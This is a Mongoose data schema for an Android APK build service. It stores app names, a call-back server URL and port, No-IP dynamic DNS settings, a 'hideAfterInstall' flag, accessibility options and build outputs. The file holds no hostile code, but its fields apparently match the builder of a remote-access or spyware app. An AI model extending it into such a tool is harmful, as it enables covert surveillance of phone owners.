const mongoose = require('mongoose');

const ApkBuildSchema = new mongoose.Schema({
  appName: {
    type: String,
    required: true,
    trim: true
  },
  packageName: {
    type: String,
    required: true,
    trim: true
  },
  versionCode: {
    type: Number,
    required: true
  },
  versionName: {
    type: String,
    required: true,
    trim: true
  },
  serverUrl: {
    type: String,
    required: true,
    trim: true
  },
  serverPort: {
    type: Number,
    required: true
  },
  noIpEnabled: {
    type: Boolean,
    default: false
  },
  noIpDomain: {
    type: String,
    trim: true
  },
  iconPath: {
    type: String,
    trim: true
  },
  webViewUrl: {
    type: String,
    trim: true
  },
  notificationTitle: {
    type: String,
    trim: true
  },
  hideAfterInstall: {
    type: Boolean,
    default: false
  },
  accessibilityOptions: {
    easyInstall: {
      type: Boolean,
      default: false
    },
    largeText: {
      type: Boolean,
      default: false
    },
    highContrast: {
      type: Boolean,
      default: false
    },
    screenReader: {
      type: Boolean,
      default: false
    }
  },
  sdkCompatibility: {
    minSdk: {
      type: Number,
      default: 21 // Android 5.0
    },
    targetSdk: {
      type: Number,
      default: 35 // Latest SDK as requested
    }
  },
  buildStatus: {
    type: String,
    enum: ['pending', 'building', 'success', 'failed'],
    default: 'pending'
  },
  buildOutput: {
    apkPath: String,
    buildLog: String,
    downloadUrl: String,
    qrCode: String
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
});

// قبل التحديث: تحديث وقت التعديل
ApkBuildSchema.pre('findOneAndUpdate', function(next) {
  this.set({ updatedAt: Date.now() });
  next();
});

module.exports = mongoose.model('ApkBuild', ApkBuildSchema);